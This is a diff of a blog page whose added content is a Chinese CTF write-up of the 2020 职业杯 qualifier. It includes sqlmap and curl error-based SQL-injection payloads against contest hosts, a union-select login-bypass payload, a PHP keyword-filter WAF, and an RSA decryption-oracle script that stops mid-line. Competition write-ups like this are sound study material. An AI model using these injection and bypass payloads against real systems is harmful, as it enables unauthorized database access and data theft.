@@ -19,18 +19,40 @@
         <meta name="keywords" content="xiabee,hexo-theme,xiabee-blog">
     
     <meta name="description" content="">
-    <meta property="og:type" content="website">
-<meta property="og:title" content="xiabee-瞎哔哔">
-<meta property="og:url" content="https://blog.xiabee.cn/archives/2020/09/index.html">
+    <meta name="description" content="简介   队伍名称 北理工的恶龙    答对题数 4   最终得分 1738.1   最终排名 18    这波是 WEB 和二进制一起白给(x)，然后被唐老板带飞  看到两道sql注入题的时候，我的第一反应是： “这一血我稳了” ，然后把题目看错了拖了两个小时…… 不过还好把WEB签到给他签上了（我好白给啊） 回顾一下比赛过程.jpg WEB就做了两个签到题… easy sql 这一看就是签到题">
+<meta property="og:type" content="article">
+<meta property="og:title" content="职业杯 2020 选拔赛回顾 &amp; Write UP">
+<meta property="og:url" content="https://blog.xiabee.cn/posts/occupation-ctf-wp/index.html">
 <meta property="og:site_name" content="xiabee-瞎哔哔">
+<meta property="og:description" content="简介   队伍名称 北理工的恶龙    答对题数 4   最终得分 1738.1   最终排名 18    这波是 WEB 和二进制一起白给(x)，然后被唐老板带飞  看到两道sql注入题的时候，我的第一反应是： “这一血我稳了” ，然后把题目看错了拖了两个小时…… 不过还好把WEB签到给他签上了（我好白给啊） 回顾一下比赛过程.jpg WEB就做了两个签到题… easy sql 这一看就是签到题">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/9c59fb4494e459e5331e12326894ff3f2df25e7c5f998c01f589ff87e0229ada.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/91ddc5397497f2c7f8a7c3a64afe5b07da7f61bd8180b4e663f9728e0762ce55.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/5a65bd1aee125974f4b704bccd98998254ddd07b11456eaa92438e1a5b975dc2.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/9b3b538a1833db4b9d234d4a5c7c2e143077270ef01b33a9dfba4f3cad60607c.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/668eb25c6a35e62af7c4af2fc4b4c1106b0bf34873b7da05fbf9e18cb9422f58.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/61d6cf52c86769ec3cd9a12d3aa4e65d9f26b6cf003294bc42690a760fb4e378.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/79375b973bef65b4203aae84ef096bdf64a861fbe666b3e1026dabef645ac693.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/633bc06b4767c098bd37d4b9009709e8739ff88db2b0487532bcfc48cd5e46ac.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/089fb5f2779b252778cb53bbfcb1632eea00acdf3f7372d61b96ce4550763f76.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/e1f8f3d7fa76c64884c27536ad84fca59de686dfa494623ceb2b435c7627669e.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/c7b7b3325996de93d49b15eb974f423ed8d6210a66c031c8d71c1db42dc60d8d.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/3a3c4cd2eccb58edda8f90127231252719ce72d3b78d24835b20a7d3115afc6a.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/1da15a1517a9a9c4525aa2cba37fb86f32f0681837347fb50e7c10c0356fc58b.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/3ba99ea6701687f9ffe79e9219bc2cbbf2659e65b2073d34c9dcbd66e41e0088.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/64646ddfc009b26f4a04aa680504c0e04374c0c73d6604bcaf51322ef42e846b.png">
+<meta property="og:image" content="https://s3.xiabee.cn/pic/2023/03/211aacc7a727e86ba524ffeb145ed6740de6abd1fc64696d85be011fe8a89c39.png">
+<meta property="article:published_time" content="2020-11-07T12:00:23.000Z">
+<meta property="article:modified_time" content="2023-03-09T13:08:03.482Z">
 <meta property="article:author" content="xiabee">
+<meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s3.xiabee.cn/pic/2023/03/9c59fb4494e459e5331e12326894ff3f2df25e7c5f998c01f589ff87e0229ada.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <link rel="icon" href="https://s3.xiabee.cn/pic/icons/favicon.jpg">
     
-    <title>xiabee-瞎哔哔</title>
+    <title>职业杯 2020 选拔赛回顾 &amp; Write UP · xiabee-瞎哔哔</title>
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
 - testing support for link[rel=preload]
@@ -230,6 +252,8 @@
         }
     </script>
     
+        <body class="post-body">
+    
         <!-- header -->
         <header class="header header-mobile">
     <!-- top read progress line -->
@@ -259,6 +283,17 @@
     </div>
     <!-- toggle banner for post layout -->
     
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">XiaBee&#39;s Studio.</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">职业杯 2020 选拔赛回顾 & Write UP</a>
+            </div>
+        </div>
+    
 </header>
 
         <!-- fixed footer -->
@@ -285,24 +320,79 @@
 
 
 
+    height:50vh;
+
 ">
     
     <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(https://s3.xiabee.cn/pic/wallpaper/22.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+                职业杯 2020 选拔赛回顾 & Write UP
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+                
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="ctf">ctf</a>
+    
+</div>
+
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">2.3k</span>阅读时长: <span class="post-count reading-time">10 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2020/11/07</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -432,95 +522,194 @@
 
             <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
             <div class="container container-unloaded">
-                <main class="main index-page">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><table>
+<thead>
+<tr>
+<th>队伍名称</th>
+<th>北理工的恶龙</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>答对题数</td>
+<td>4</td>
+</tr>
+<tr>
+<td>最终得分</td>
+<td>1738.1</td>
+</tr>
+<tr>
+<td>最终排名</td>
+<td>18</td>
+</tr>
+</tbody></table>
+<p><img src="https://s3.xiabee.cn/pic/2023/03/9c59fb4494e459e5331e12326894ff3f2df25e7c5f998c01f589ff87e0229ada.png" alt="img"></p>
+<p>这波是 WEB 和二进制一起白给(x)，然后被<a target="_blank" rel="noopener" href="https://code.felinae98.cn/">唐老板</a>带飞 </p>
+<p>看到两道sql注入题的时候，我的第一反应是： “这一血我稳了” ，然后把题目看错了拖了两个小时…… 不过还好把WEB签到给他签上了（我好白给啊）</p>
+<p>回顾一下比赛过程.jpg</p>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>就做了两个签到题…</p>
+<h3 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy sql"></a>easy sql</h3><p><img src="https://s3.xiabee.cn/pic/2023/03/91ddc5397497f2c7f8a7c3a64afe5b07da7f61bd8180b4e663f9728e0762ce55.png" alt="img"></p>
+<p>这一看就是签到题啊，直接上<code>sqlmap</code>一把梭：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://124.71.148.26:30022/&quot;</span> --form</span><br></pre></td></tr></table></figure>
+
+
+
+<p>有时间盲注，那就先梭着：</p>
+<p><img src="https://s3.xiabee.cn/pic/2023/03/5a65bd1aee125974f4b704bccd98998254ddd07b11456eaa92438e1a5b975dc2.png" alt="img"></p>
+<p>然后直接爆表爆列爆字段：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://124.71.148.26:30022/&quot;</span> --form -D security --tables</span><br><span class="line">sqlmap -u <span class="string">&quot;http://124.71.148.26:30022/&quot;</span> --form -D security -T flag --columns</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s3.xiabee.cn/pic/2023/03/9b3b538a1833db4b9d234d4a5c7c2e143077270ef01b33a9dfba4f3cad60607c.png" alt="img"></p>
+<p>就在这里，我爆不下去了……爆不出列名，爆不出字段，然后时间盲注注出来全是空表假表：</p>
+<p><img src="https://s3.xiabee.cn/pic/2023/03/668eb25c6a35e62af7c4af2fc4b4c1106b0bf34873b7da05fbf9e18cb9422f58.png" alt="img"></p>
+<p>后面猜测应该是网络不稳定，导致每次的回显时间波动极大，造成了时间盲注的误判……当然也可能是主办方设置了障碍（x） 这个时候本来应该手写脚本时间盲注的，然后张大佬curl了一下发现这玩意居然有报错回显？？？</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://124.71.148.26:30022/ -X POST -d <span class="string">&quot;uname=123&#x27;&amp;passwd=&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://s3.xiabee.cn/pic/2023/03/61d6cf52c86769ec3cd9a12d3aa4e65d9f26b6cf003294bc42690a760fb4e378.png" alt="img"></p>
+<p>居然写进了font里面，够狠</p>
+<p>直接报错注入一把梭：（前面已经查到flag表了，这里直接爆字段就好）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://124.71.148.26:30022/ -X POST -d <span class="string">&quot;uname=admin&#x27; and extractvalue(1, concat(0x7e, (select * from flag limit 1)))--&amp;passwd=&#x27;(123&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s3.xiabee.cn/pic/2023/03/79375b973bef65b4203aae84ef096bdf64a861fbe666b3e1026dabef645ac693.png" alt="img"></p>
+<p>flag太长显示不全，截断之后看后半段：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://124.71.148.26:30022/ -X POST -d <span class="string">&quot;uname=admin&#x27; and extractvalue(1, concat(0x7e, (right((select * from flag limit 1),20))))--&amp;passwd=&#x27;(123&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s3.xiabee.cn/pic/2023/03/633bc06b4767c098bd37d4b9009709e8739ff88db2b0487532bcfc48cd5e46ac.png" alt="img"></p>
+<p>综合一下，payload分两段，注意括号引号闭合即可：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## http://124.71.148.26:30022/</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">uname</span>=admin<span class="string">&#x27; and extractvalue(1, concat(0x7e, (select * from flag limit 1)))--</span></span><br><span class="line"><span class="string">&amp;passwd=&#x27;</span>(123</span><br><span class="line"><span class="comment"># 第一段爆出前半段flag</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">## http://124.71.148.26:30022/</span></span><br><span class="line"><span class="built_in">uname</span>=admin<span class="string">&#x27; and extractvalue(1, concat(0x7e, (</span></span><br><span class="line"><span class="string">right((select * from flag limit 1),20)</span></span><br><span class="line"><span class="string">)))--</span></span><br><span class="line"><span class="string">&amp;passwd=&#x27;</span>(123</span><br><span class="line"><span class="comment"># 第二段爆后半段</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="easysqli"><a href="#easysqli" class="headerlink" title="easysqli"></a>easysqli</h3><p>题面：</p>
+<p><img src="https://s3.xiabee.cn/pic/2023/03/089fb5f2779b252778cb53bbfcb1632eea00acdf3f7372d61b96ce4550763f76.png" alt="img"></p>
+<p>带验证码的注入</p>
+<p>一看标题就知道，这在暗示我注入（划掉）</p>
+<p>盲猜一波验证码不失效漏洞，直接打开BP开始爆破……然后发现除了第一个是正常回显，其他都是“验证码错误”……Fine，这个验证单次有效，验证码破不了，真就防暴力了</p>
+<p><img src="https://s3.xiabee.cn/pic/2023/03/e1f8f3d7fa76c64884c27536ad84fca59de686dfa494623ceb2b435c7627669e.png" alt="img"></p>
+<p>暴力破不了，就看看看hint：点击 hint 看到了部分源代码：</p>
+<p><img src="https://s3.xiabee.cn/pic/2023/03/c7b7b3325996de93d49b15eb974f423ed8d6210a66c031c8d71c1db42dc60d8d.png" alt="img"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//a &quot;part&quot; of the source code here</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqlWaf</span>(<span class="params"><span class="variable">$s</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/xml|extractvalue|regexp|copy|read|file|select|between|from|where|create|grand|dir|insert|link|substr|mid|server|drop|=|&gt;|&lt;|;|&quot;|\^|\||\ |\&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$filter</span>,<span class="variable">$s</span>))</span><br><span class="line">        <span class="keyword">return</span> False;</span><br><span class="line">    <span class="keyword">return</span> True;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;VerifyCode&#x27;</span>]))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;?&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$username</span> = <span class="title function_ invoke__">strval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">    <span class="variable">$password</span> = <span class="title function_ invoke__">strval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> ( !<span class="title function_ invoke__">sqlWaf</span>(<span class="variable">$password</span>) )</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;damn hacker&#x27;</span> ,<span class="string">&quot;./index.php&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;$&#123;username&#125;&#x27; AND password= &#x27;$&#123;password&#125;&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//    password format: /[A-Za-z0-9]/</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] == <span class="variable">$password</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$message</span> = <span class="variable">$FLAG</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$message</span> = <span class="string">&quot;username or password wrong, are you admin?&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$message</span> = <span class="string">&quot;wrong user&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&quot;user not exist or wrong password&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>代码审计一波：</p>
+<ul>
+<li><code>sqlwaf</code> 只对 <code>password</code> 做了检测，对 <code>username</code> 没做限制？？？ 那不就对着 <code>username</code>一顿梭 </li>
+<li>再看第 28 行和 30 行，意思是匹配到用户名为 <code>admin</code> 并且密码为对应密码的数据时，输出 <code>flag</code>，而且在 <code>password</code>这里做的是弱比较</li>
+</ul>
+<p><img src="https://s3.xiabee.cn/pic/2023/03/3a3c4cd2eccb58edda8f90127231252719ce72d3b78d24835b20a7d3115afc6a.png" alt="img"></p>
+<p>WEB狗第一反应当然是弱比较啊！！直接冲payload，然后发现这个password好像有点复杂，弱比较也比不上…… 再往看看别的：</p>
+<p><img src="https://s3.xiabee.cn/pic/2023/03/1da15a1517a9a9c4525aa2cba37fb86f32f0681837347fb50e7c10c0356fc58b.png" alt="img"></p>
+<p>第26、27行，后端只要检测到了数据就往下执行…… <del>这个要慌，问题挺大的</del> </p>
+<p>然后就利用这个，加上一点 SQL 的奇技淫巧：<code>union select</code> 一个元组出来，放到首行，那这个检测到的 <code>password</code> 就是我们自己设置的表外值了 </p>
+<p>本地测试：</p>
+<p><img src="https://s3.xiabee.cn/pic/2023/03/3ba99ea6701687f9ffe79e9219bc2cbbf2659e65b2073d34c9dcbd66e41e0088.png" alt="img"></p>
+<p>直接查询表外值 这里我们 <code>select</code>了一个不存在的用户，检测结果自然只剩下我们 <code>union select</code> 中的内容</p>
+<p>所以最终payload：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: a<span class="string">&#x27; union select 1,&#x27;</span>admin<span class="string">&#x27;,&#x27;</span>123<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">password: 123</span></span><br></pre></td></tr></table></figure>
+
+<p>签到题浪费太多时间了，导致后面的题直接白给x（我好菜啊）</p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>张大佬被二进制搞自闭了，直接加入唐老板开冲密码学……</p>
+<p><img src="https://s3.xiabee.cn/pic/2023/03/64646ddfc009b26f4a04aa680504c0e04374c0c73d6604bcaf51322ef42e846b.png" alt="img"></p>
+<p>一个一血一个二血，唐老板NB！张大佬NB！ </p>
+<p><del>WEB弟弟落泪，什么时候才能像唐老板一样强啊QAQ</del></p>
+<p>以下内容为唐老板亲笔 WP：</p>
+<h3 id="circuit3"><a href="#circuit3" class="headerlink" title="circuit3"></a>circuit3</h3><p>题目要求我们设计一套逻辑电路满足一系列测试。 </p>
+<p>我们观察到两个输入都是256位，输出位32位，要求在输入向量相同的时候输出100000….不同时输出11111111….，并且需要有一个后门，在b向量为某个值的时候输出1000000….，并且只给了3个逻辑运算，AND，XOR和INV。 </p>
+<p>我们可以这样设计，后门简单的让b的每一位AND起来，那么只有在b为\xff * 32时最后的结果才为1，如果要判断两个向量相同，可以将a和b的每一位进行异或，取反再AND起来。最后需要在后门条件达成或者向量相同是输出100000…..，因为没有或，所以需要用与和取反表示或，在此不在赘述。 然后再考虑wire表的含义，根据题目中的含义和我们需要的临时变量我们定义下面的wire表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wire[0-255] inputA</span><br><span class="line">wire[256-511] input B</span><br><span class="line">wire[512] 后门检查结果</span><br><span class="line">wire[513] XOR结果临时储存</span><br><span class="line">wire[514] 向量相同检查结果</span><br><span class="line">wire[515-547] 输出结果</span><br></pre></td></tr></table></figure>
+
+
+
+<p>我们首选要对wire[512]和wire[514]的结果取反为1，用下面代码生成电路描述文件：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">content = <span class="string">&#x27;&#x27;&#x27;a 547</span></span><br><span class="line"><span class="string">256 256 32</span></span><br><span class="line"><span class="string">&#123;1&#125;</span></span><br><span class="line"><span class="string">a  512 512 INV</span></span><br><span class="line"><span class="string">a  514 514 INV</span></span><br><span class="line"><span class="string">a  515 515 INV</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>, <span class="number">256</span>+<span class="number">128</span>):</span><br><span class="line">    content += <span class="string">&#x27;a  &#123;&#125; 512 512 AND\n&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line"><span class="comment"># b backdoor</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">    content += <span class="string">&#x27;a  &#123;&#125; &#123;&#125; 513 XOR\na  513 513 INV\na  513 514 514 AND\n&#x27;</span>.<span class="built_in">format</span>(i, i+<span class="number">256</span>)</span><br><span class="line"><span class="comment"># # a b same</span></span><br><span class="line">content += <span class="string">&#x27;&#x27;&#x27;a  512 512 INV</span></span><br><span class="line"><span class="string">a  514 514 INV</span></span><br><span class="line"><span class="string">a  512 514 513 AND</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">516</span>, <span class="number">547</span>):</span><br><span class="line">    <span class="comment"># content += &#x27;a  &#123;&#125; 513 INV\n&#x27;.format(i)</span></span><br><span class="line">    content += <span class="string">&#x27;a  512 514 &#123;&#125; AND\n&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(content))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;res&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(content)</span><br></pre></td></tr></table></figure>
+
+<p>最后生成文件的大小有 19k，通过 socket 上传一半会断开，故对输入变量只检查前半部分，成功将文件大小缩减到 9k</p>
+<h3 id="crypto-lp"><a href="#crypto-lp" class="headerlink" title="crypto_lp"></a>crypto_lp</h3><p>密码学签到题，首先可见它生成了两个 RSA 秘钥，用第一个加密了随机的 secret，第二个加密了flag。</p>
+<p> 题目提供了第一个 RSA 的解密机，但是不能解密 secret，但是我们可以尝试解密 <code>2*secret</code>。</p>
+<p>有： 所以我们计算 <code>2ec mod n</code>后进行解密，得到 <code>2m mod n</code>，如果 <code>2m &lt; n</code> 那么结果为偶数，直接除 2 得到 secret，反之加 n 除 2 后得到结果。 第二层需要提供正确的 secret，提供一个解密机但是只提供最后一位，直接使用 Parity Oracle 算出flag。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="keyword">from</span> nclib <span class="keyword">import</span> Netcat</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"> </span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">io = Netcat((<span class="string">&#x27;119.3.152.203&#x27;</span>, <span class="number">7001</span>), verbose=<span class="literal">False</span>)</span><br><span class="line">io.recv_until(<span class="string">b&#x27;llp\n&#x27;</span>)</span><br><span class="line">n = <span class="built_in">int</span>(io.recv_until(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">nn = <span class="built_in">int</span>(io.recv_until(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">enc_flag = <span class="built_in">int</span>(io.recv_until(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    io.recv_until(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.send_line(<span class="string">b&#x27;l&#x27;</span>)</span><br><span class="line">    enc_sec = <span class="built_in">int</span>(io.recv_until(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">    payload = <span class="built_in">pow</span>(<span class="number">2</span>, e, n) * enc_sec % n</span><br><span class="line">    io.recv_until(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.send_line(<span class="string">b&#x27;p&#x27;</span>)</span><br><span class="line">    io.send_line(<span class="built_in">str</span>(payload).encode())</span><br><span class="line">    sec_2 = <span 